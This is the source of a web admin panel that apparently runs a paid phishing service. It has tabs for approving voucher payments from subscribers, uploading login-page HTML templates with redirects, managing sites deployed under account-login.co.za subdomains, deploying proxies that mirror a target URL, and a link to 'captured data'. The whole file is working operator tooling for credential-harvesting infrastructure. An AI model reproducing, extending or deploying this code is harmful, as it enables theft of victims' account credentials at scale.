<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D-TECH Cloud Admin</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { margin-top: 0; color: #0070f3; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], textarea, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        textarea { height: 150px; font-family: monospace; }
        button { background: #0070f3; color: #fff; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-size: 14px; }
        button.btn-danger { background: #d32f2f; }
        button.btn-success { background: #28a745; }
        button:hover { opacity: 0.9; }

        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #eee; overflow-x: auto; }
        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; white-space: nowrap; }
        .tab.active { border-bottom-color: #0070f3; color: #0070f3; font-weight: bold; }

        .hidden { display: none; }
        #message { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .nav-links { margin-bottom: 20px; text-align: right; }
        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }

        /* Table Styles */
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #eee; }
        th { background: #fafafa; }

        /* Badges */
        .badge { padding: 4px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; text-transform: uppercase; }
        .badge-pending { background: #ffeeba; color: #856404; }
        .badge-active { background: #d4edda; color: #155724; }
        .badge-locked { background: #f8d7da; color: #721c24; }
        .badge-banned { background: #333; color: #fff; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-links">
            <a href="captures.html">View Captured Data &rarr;</a>
        </div>
        <h1>ðŸš€ Cloud Admin Panel</h1>

        <div class="tabs">
            <div class="tab active" onclick="switchTab('vouchers')">Pending Vouchers</div>
            <div class="tab" onclick="switchTab('users')">Manage Users</div>
            <div class="tab" onclick="switchTab('templates')">Templates</div>
            <div class="tab" onclick="switchTab('sites')">Sites</div>
            <div class="tab" onclick="switchTab('proxy')">Deploy Proxy</div>
        </div>

        <!-- Vouchers Section -->
        <div id="vouchers-section" class="form-section">
            <h2>Pending Payments</h2>
            <button onclick="loadVouchers()" style="margin-bottom: 10px;">Refresh</button>
            <div id="voucher-list">Loading...</div>
        </div>

        <!-- Users Section -->
        <div id="users-section" class="form-section hidden">
            <h2>User Database</h2>
            <button onclick="loadUsers()" style="margin-bottom: 10px;">Refresh</button>
            <div id="user-list">Loading...</div>
        </div>

        <!-- Templates Section -->
        <div id="templates-section" class="form-section hidden">
            <h2>Existing Templates</h2>
            <div id="template-list">Loading...</div>

            <h3>Add New Template</h3>
            <div class="form-group">
                <label>Template Name</label>
                <input type="text" id="tpl-name" placeholder="e.g., login-page-v1">
            </div>
            <div class="form-group">
                <label>Redirect URL (Optional)</label>
                <input type="text" id="tpl-redirect" placeholder="https://example.com/success">
                <small>Leave blank to use default.</small>
            </div>
            <div class="form-group">
                <label>Preview Image URL (Optional)</label>
                <input type="text" id="tpl-preview" placeholder="https://example.com/preview.png">
                <small>Used for Gold Plan preview links.</small>
            </div>
            <div class="form-group">
                <label>HTML Content</label>
                <input type="file" id="tpl-file" accept=".html,.txt" onchange="loadFile(this, 'tpl-content')" style="margin-bottom: 10px;">
                <textarea id="tpl-content" placeholder="<html>...</html>"></textarea>
            </div>
            <div class="form-group">
                <label>
                    <input type="checkbox" id="tpl-isGold"> Gold Exclusive?
                </label>
            </div>
            <button onclick="saveTemplate()">Save Template</button>
        </div>

        <!-- Sites Section -->
        <div id="sites-section" class="form-section hidden">
            <h2>Manage Deployed Sites</h2>
            <button onclick="loadSites()" style="margin-bottom:10px;">Refresh List</button>
            <div id="site-list">Loading...</div>
        </div>

        <!-- Proxy Form -->
        <div id="proxy-section" class="form-section hidden">
            <p>Admin-only proxy deployment (bypasses templates).</p>
            <div class="form-group">
                <label>Subdomain</label>
                <input type="text" id="proxy-subdomain" placeholder="e.g., blog">
            </div>
            <div class="form-group">
                <label>Target URL</label>
                <input type="text" id="proxy-url" placeholder="https://example.com">
            </div>
            <button onclick="saveProxy()">Create Proxy</button>
        </div>

        <div id="message"></div>
    </div>

    <script>
        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';

        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.form-section').forEach(f => f.classList.add('hidden'));

            if (tab === 'vouchers') {
                document.querySelector('.tabs .tab:nth-child(1)').classList.add('active');
                document.getElementById('vouchers-section').classList.remove('hidden');
                loadVouchers();
            } else if (tab === 'users') {
                document.querySelector('.tabs .tab:nth-child(2)').classList.add('active');
                document.getElementById('users-section').classList.remove('hidden');
                loadUsers();
            } else if (tab === 'templates') {
                document.querySelector('.tabs .tab:nth-child(3)').classList.add('active');
                document.getElementById('templates-section').classList.remove('hidden');
                loadTemplates();
            } else if (tab === 'sites') {
                document.querySelector('.tabs .tab:nth-child(4)').classList.add('active');
                document.getElementById('sites-section').classList.remove('hidden');
                loadSites();
            } else {
                document.querySelector('.tabs .tab:nth-child(5)').classList.add('active');
                document.getElementById('proxy-section').classList.remove('hidden');
            }
        }

        function loadFile(input, targetId) {
            const file = input.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = function(e) {
                document.getElementById(targetId).value = e.target.result;
            };
            reader.readAsText(file);
        }

        // --- VOUCHERS ---
        async function loadVouchers() {
            const div = document.getElementById('voucher-list');
            div.innerHTML = 'Loading...';
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/vouchers`, { credentials: 'include' });
                if (res.status === 401) { window.location.href = 'admin-login.html'; return; }
                const data = await res.json();

                div.innerHTML = '';
                if (data.success && data.data.length > 0) {
                    const table = document.createElement('table');
                    table.innerHTML = `<thead><tr>
                        <th>Time</th><th>User Code</th><th>Type</th><th>Voucher Code</th><th>Plan</th><th>Action</th>
                    </tr></thead>`;
                    const tbody = document.createElement('tbody');
                    data.data.forEach(v => {
                        const tr = document.createElement('tr');
                        tr.innerHTML = `
                            <td>${new Date(v.submitted).toLocaleString()}</td>
                            <td>${v.uniqueCode}</td>
                            <td>${v.voucherType}</td>
                            <td><code>${v.voucherCode}</code></td>
                            <td>${v.plan.toUpperCase()}</td>
                            <td>
                                <button class="btn-success" onclick="processVoucher('${v.id}', 'approve')">Approve</button>
                                <button class="btn-danger" onclick="declineVoucher('${v.id}')">Decline</button>
                            </td>
                        `;
                        tbody.appendChild(tr);
                    });
                    table.appendChild(tbody);
                    div.appendChild(table);
                } else {
                    div.innerHTML = '<p>No pending vouchers.</p>';
                }
            } catch (e) { div.innerHTML = 'Error: ' + e.message; }
        }

        async function processVoucher(id, action, reason = null) {
            if (!confirm(`Are you sure you want to ${action} this voucher?`)) return;
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/voucher_action`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ voucherId: id, action, reason }),
                    credentials: 'include'
                });
                const data = await res.json();
                if(data.success) {
                    showMessage(`Voucher ${action}d successfully`, 'success');
                    loadVouchers();
                } else {
                    showMessage(data.error, 'error');
                }
            } catch (e) { showMessage(e.message, 'error'); }
        }

        function declineVoucher(id) {
            const reason = prompt("Enter reason for declining (e.g. Invalid Code):", "Invalid/Used Voucher");
            if (reason) {
                processVoucher(id, 'decline', reason);
            }
        }

        // --- USERS ---
        async function loadUsers() {
             const div = document.getElementById('user-list');
            div.innerHTML = 'Loading...';
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/users`, { credentials: 'include' });
                const data = await res.json();

                div.innerHTML = '';
                if (data.success && data.data.length > 0) {
                    const table = document.createElement('table');
                    table.innerHTML = `<thead><tr>
                        <th>Unique Code</th><th>Plan</th><th>Status</th><th>Strikes</th><th>Expiry</th>
                    </tr></thead>`;
                    const tbody = document.createElement('tbody');
                    data.data.forEach(u => {
                        const expiry = u.expiry ? new Date(u.expiry).toLocaleDateString() : 'N/A';
                        const tr = document.createElement('tr');
                        tr.innerHTML = `
                            <td>${u.code}</td>
                            <td>${u.plan.toUpperCase()}</td>
                            <td><span class="badge badge-${u.status}">${u.status.toUpperCase()}</span></td>
                            <td>${u.strikes || 0}</td>
                            <td>${expiry}</td>
                        `;
                        tbody.appendChild(tr);
                    });
                    table.appendChild(tbody);
                    div.appendChild(table);
                } else {
                    div.innerHTML = '<p>No users found.</p>';
                }
            } catch (e) { div.innerHTML = 'Error: ' + e.message; }
        }

        // --- SITES ---
        async function loadSites() {
            const list = document.getElementById('site-list');
            list.innerHTML = 'Loading...';
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/sites`, { credentials: 'include' });
                const data = await res.json();
                list.innerHTML = '';

                if (data.success && data.data.length > 0) {
                    const table = document.createElement('table');
                    table.innerHTML = `<thead><tr><th>Subdomain</th><th>Action</th></tr></thead>`;
                    const tbody = document.createElement('tbody');
                    data.data.forEach(site => {
                        const tr = document.createElement('tr');
                        tr.innerHTML = `
                            <td><a href="https://${site}.account-login.co.za" target="_blank">${site}</a></td>
                            <td><button class="btn-danger" onclick="deleteSite('${site}')">Delete</button></td>
                        `;
                        tbody.appendChild(tr);
                    });
                    table.appendChild(tbody);
                    list.appendChild(table);
                } else {
                    list.innerText = 'No sites found.';
                }
            } catch (e) {
                list.innerText = 'Error loading sites: ' + e.message;
            }
        }

        async function deleteSite(subdomain) {
            if(!confirm(`Delete site "${subdomain}"? This cannot be undone.`)) return;
            try {
                 const res = await fetch(`${WORKER_URL}/api/admin/sites?subdomain=` + subdomain, {
                     method: 'DELETE',
                     credentials: 'include'
                 });
                 loadSites();
            } catch(e) { alert(e.message); }
        }

        // --- TEMPLATES ---
        async function loadTemplates() {
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/templates`, { credentials: 'include' });
                if (res.status === 401) { window.location.href = 'admin-login.html'; return; }
                const data = await res.json();
                const list = document.getElementById('template-list');
                list.innerHTML = '';

                if (data.success && data.data.length > 0) {
                    const table = document.createElement('table');
                    table.innerHTML = `<thead><tr><th>Name</th><th>Status</th><th>Redirect</th><th>Action</th></tr></thead>`;
                    const tbody = document.createElement('tbody');
                    data.data.forEach(tpl => {
                        const redirect = tpl.redirectUrl ? `<a href="${tpl.redirectUrl}" target="_blank">Link</a>` : 'Default';
                        const badge = tpl.isGoldOnly ? '<span class="badge" style="background:gold; color:black;">GOLD ONLY</span>' : '<span class="badge badge-active">PUBLIC</span>';
                        const tr = document.createElement('tr');
                        tr.innerHTML = `
                            <td>${tpl.name}</td>
                            <td>${badge}</td>
                            <td>${redirect}</td>
                            <td><button class="btn-danger" onclick="deleteTemplate('${tpl.name}')">Delete</button></td>
                        `;
                        tbody.appendChild(tr);
                    });
                    table.appendChild(tbody);
                    list.appendChild(table);
                } else {
                    list.innerHTML = '<p>No templates found.</p>';
                }
            } catch (e) { document.getElementById('template-list').innerText = 'Error loading templates.'; }
        }

        async function saveTemplate() {
            const name = document.getElementById('tpl-name').value;
            const content = document.getElementById('tpl-content').value;
            const redirectUrl = document.getElementById('tpl-redirect').value;
            const previewUrl = document.getElementById('tpl-preview').value;
            const isGoldOnly = document.getElementById('tpl-isGold').checked;

            if (!name || !content) return showMessage('Missing fields', 'error');

            const btn = document.querySelector('#templates-section button');
            const originalText = btn.innerText;
            btn.innerText = 'Saving...';

            try {
                const res = await fetch(`${WORKER_URL}/api/admin/templates`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({name, content, redirectUrl, previewUrl, isGoldOnly}),
                    credentials: 'include'
                });
                const data = await res.json();
                if (data.success) {
                    showMessage('Template saved!', 'success');
                    document.getElementById('tpl-name').value = '';
                    document.getElementById('tpl-content').value = '';
                    document.getElementById('tpl-redirect').value = '';
                    document.getElementById('tpl-preview').value = '';
                    document.getElementById('tpl-isGold').checked = false;
                    loadTemplates();
                } else {
                    showMessage(data.error, 'error');
                }
            } catch (e) { showMessage(e.message, 'error'); }
            btn.innerText = originalText;
        }

        async function deleteTemplate(name) {
            if(!confirm('Delete template ' + name + '?')) return;
            try {
                 const res = await fetch(`${WORKER_URL}/api/admin/templates?name=` + name, {
                     method: 'DELETE',
                     credentials: 'include'
                 });
                 loadTemplates();
            } catch(e) { alert(e.message); }
        }

        async function saveProxy() {
            const subdomain = document.getElementById('proxy-subdomain').value;
            const content = document.getElementById('proxy-url').value;
            if (!subdomain || !content) return showMessage('Missing fields', 'error');

            try {
                const response = await fetch(`${WORKER_URL}/api/save`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ subdomain, type: 'PROXY', content }),
                    credentials: 'include'
                });
                const result = await response.json();
                if (result.success) showMessage('Proxy created!', 'success');
                else showMessage(result.error, 'error');
            } catch (err) {
                showMessage('Network Error: ' + err.message, 'error');
            }
        }

        function showMessage(text, type) {
            const el = document.getElementById('message');
            el.innerText = text;
            el.className = type;
            el.style.display = 'block';
            setTimeout(() => { el.style.display = 'none'; }, 5000);
        }

        // Initial load
        loadVouchers();
    </script>
</body>
</html>
